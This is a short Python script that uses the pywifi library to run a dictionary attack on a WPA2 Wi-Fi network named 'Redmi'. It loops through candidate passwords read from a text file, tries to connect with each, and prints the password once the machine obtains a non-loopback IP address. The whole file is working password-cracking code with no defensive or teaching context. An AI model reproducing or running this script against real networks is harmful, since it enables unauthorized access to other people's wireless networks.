import pywifi
from pywifi import const
import time
import socket
wifi = pywifi.PyWiFi()

iface = wifi.interfaces()[0]

hostname = socket.gethostname()
with open("file.txt", "r") as f:
    for line in f:
            iface.disconnect()
            profile = pywifi.Profile()
            profile.auth = const.AUTH_ALG_OPEN
            profile.ssid = 'Redmi'
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = str(line)

            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            profile = iface.add_network_profile(profile)
            iface.connect(profile)
            time.sleep(0.2)

            ip_address = socket.gethostbyname(hostname)

            if ip_address != "127.0.0.1":
                break
    print("\n Password Found: " + line)

